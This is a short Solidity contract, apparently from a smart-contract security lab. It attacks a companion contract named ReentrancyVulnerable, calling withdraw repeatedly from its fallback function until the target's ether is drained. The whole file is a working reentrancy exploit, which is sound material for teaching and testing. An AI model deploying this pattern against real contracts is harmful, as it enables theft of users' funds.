// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.28;

import "./ReentrancyVulnerable.sol";

contract ReentrancyAttacker {
    
    ReentrancyVulnerable public vulnerable;
    
    constructor(ReentrancyVulnerable _vulnerable) {
        vulnerable = _vulnerable;
    }
    function attack() external payable{
        vulnerable.withdraw(1 ether);
    }

    fallback() external payable {
        if(address(vulnerable).balance >= 1 ether) {
            vulnerable.withdraw(1 ether);
        }
    }
}
